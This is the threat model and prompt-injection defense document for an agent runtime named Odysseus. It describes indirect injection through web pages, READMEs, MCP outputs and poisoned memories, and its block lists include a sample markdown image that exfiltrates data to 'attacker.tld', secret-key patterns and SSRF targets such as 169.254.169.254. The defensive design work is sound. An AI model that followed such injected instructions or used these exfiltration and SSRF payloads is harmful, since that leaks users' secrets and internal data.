# Odysseus Threat Model & Prompt-Injection Defense

This document defines the threat model for Odysseus's agent runtime, tool execution engine, MCP client, skills, and memory subsystems (`backend/domain/tools/provenance.py`, `policy.py`, `filesystem.py`, `exec_sandbox.py`, `web_tools.py`, and `backend/mcp/manager.py`).

---

## 1. Trust Boundaries & Provenance Taint Model

Odysseus classifies every piece of data entering an agent run into two trust levels via `ProvenanceTag(source, trust, label)`:

| Source | Initial Trust | Rationale |
| :--- | :--- | :--- |
| Authenticated user message | `trusted` | Direct instruction from the session owner |
| System prompt & built-in tool schemas | `trusted` | Server-controlled static instructions |
| `web_search`, `fetch_url`, `youtube_transcript` | `untrusted` | Arbitrary attacker-controlled content from the public internet |
| Uploaded attachments & external files | `untrusted` | May contain hidden instructions or polyglot payloads |
| MCP server tool outputs & descriptions | `untrusted` | External or third-party MCP servers may be compromised or malicious |
| Imported `.zip` / URL skills (`untrusted=True`) | `untrusted` | Unreviewed community skills |
| Memories originating from tainted runs | `untrusted` | Prevents cross-session stored indirect prompt injection |

### 1.1 Randomized Per-Run Delimiters
Every run generates a cryptographically random 12-hex-character `run_nonce`. Untrusted tool outputs, fetched pages, and memories are wrapped in `<untrusted_data_{run_nonce} source="..." trust="untrusted">...</untrusted_data_{run_nonce}>`. Any attempt inside the untrusted payload to close the tag (`</untrusted_data_...>`) is neutralized before wrapping.

### 1.2 Tainted-Turn Policy Escalation (`RunTaintTracker`)
The moment a run ingests any `untrusted` tool output, attachment, or unconfirmed memory, `RunTaintTracker.tainted` becomes `True` for the remainder of the run.
- **Invariant**: While `context_tainted=True`, **every** tool call with `risk in {"write", "exec", "network", "admin"}` is escalated to `ask` (requiring explicit human approval in `interactive` mode) or `deny` (in `background` mode), **even if the user previously created an `always(...)` allow rule for that tool/pattern**.
- This defeats indirect prompt injection attacks where a malicious webpage, README, or MCP tool output instructs the model to run `shell`, `write_file`, `fetch_url` (exfiltration), or `memory_save` (memory poisoning).

---

## 2. Exfiltration & Output Sanitization Guards

Even if an attacker cannot execute a tool without approval, they may attempt zero-click data exfiltration via assistant Markdown rendering:
1. **External Markdown Image Blocking**: `sanitize_assistant_markdown_exfiltration` strips `![alt](https://attacker.tld/steal?data=...)` and replaces it with `[Blocked external image: <alt>]`.
2. **Suspicious Exfiltration Links**: Markdown links whose query strings contain long base64/hex blobs or secret patterns (`sk-...`, `ODYSSEUS_SECRET_KEY`, `BEGIN PRIVATE KEY`) are defanged (`[Blocked suspicious link: ...]`).
3. **Invisible & Unicode Tag Stripping**: `strip_invisible_and_tag_chars` removes zero-width characters (`U+200B..U+200F`, `U+FEFF`), BiDi overrides (`U+202A..U+202E`, `U+2066..U+2069`), and Unicode Tag block smuggling (`U+E0000..U+E007F`) from untrusted inputs and assistant outputs.

---

## 3. Approval Anti-Spoofing & Structured Rules

1. **Structured Patterns Only**: `always` rules never evaluate arbitrary regexes over free text. Shell rules use `argv_prefix:[...]` after rejecting any command containing shell metacharacters (`;`, `|`, `&`, `` ` ``, `$()`, `>`, `<`, `\n`). File rules use workspace-relative `path_glob:...`, and network rules use `host_allow:...`.
2. **Homoglyph & BiDi Spoof Detection**: `normalize_and_flag_approval_args` inspects all tool arguments and `Tool.explain()` strings for mixed-script homoglyphs (e.g., Cyrillic `а` mixed with Latin), BiDi RTL overrides (`\u202e`), and control characters, surfacing prominent `[SPOOF WARNING: ...]` banners on the approval card.
3. **Non-Replayable Atomic Resolution**: Each `ApprovalRecord` is bound to a specific `(run_id, tool_call_id)` and resolved inside an atomic database write transaction so concurrent `approve`/`deny` requests cannot double-fire or be replayed across tool calls.

---

## 4. Sandbox, Filesystem Jail & SSRF Defenses

1. **Workspace Filesystem Jail (`backend/domain/tools/filesystem.py`)**:
   - Canonicalizes `workspace_root` and candidate paths via `Path.resolve()`, enforcing `resolved.is_relative_to(ws_root)`.
   - Rejects null bytes, control characters, traversal (`..`), symlinks pointing outside the jail, and special files (FIFOs, sockets, device nodes) so reads never block on named pipes or leak host files.
2. **Process-Group & Rlimit Sandbox (`backend/domain/tools/exec_sandbox.py`)**:
   - Spawns subprocesses in a new session (`os.setsid()`) with `RLIMIT_CPU`, `RLIMIT_FSIZE`, `RLIMIT_NOFILE`, `RLIMIT_CORE=0`, and optional `RLIMIT_NPROC`.
   - Scrubs all host environment variables, passing only a minimal synthetic `ENV` (`PATH`, `HOME`, `TMPDIR`, `NO_PROXY="*"`, dead loopback proxy).
   - Terminates the entire process group with SIGTERM followed by a bounded polling grace period and a SIGKILL backstop on timeout, output-cap overflow, or cancellation; process-group cleanup is best-effort and the leader is reaped by the async subprocess API.
3. **SSRF & DNS-Rebinding Safe Fetcher (`backend/domain/tools/web_tools.py`)**:
   - Blocks loopback, RFC1918, link-local (`169.254.169.254`), CGNAT (`100.64.0.0/10`), IPv4-mapped IPv6, decimal/hex/octal obfuscated IP literals (`2130706433`, `0x7f000001`, `0177.0.0.1`), internal hostnames (`.local`, `.internal`, `metadata.google.internal`), and non-HTTP(S) schemes.
   - Re-validates every HTTP redirect hop and DNS resolution and enforces strict byte (`max_bytes`) and wall-clock (`timeout_seconds`) caps.

---

## 5. Red-Team Verification Suite

- **`backend/tests/security/injection/corpus.json` & `test_injection_corpus.py`**:
  - **105 red-team cases** (85 canonical + 20 novel self-authored attacks) across 7 categories: direct override, indirect web/HTML/CSS-hidden injection, attachment/README injection, MCP tool output & description poisoning, Unicode tag/BiDi/homoglyph smuggling, Markdown image/link exfiltration, and cross-turn memory poisoning.
  - Verified against a scripted `FakeProvider` that intentionally obeys the attacker's injected payload: **0** unauthorized `write`/`exec`/`network` executions occur and **0** secret markers leak via unblocked external URLs.
- **`backend/tests/adversarial/test_phase03_adversarial.py` & `backend/tests/unit/test_phase03_fenced_parser_and_fs_jail.py`**:
  - Hypothesis fuzzing (`>= 10,000` random strings) on `parse_fenced_tool_calls`, 60+ filesystem jail escape vectors (including symlink chains and FIFOs), 20 SSRF IP/scheme/redirect vectors, approval race conditions, and process-group grandchild termination.
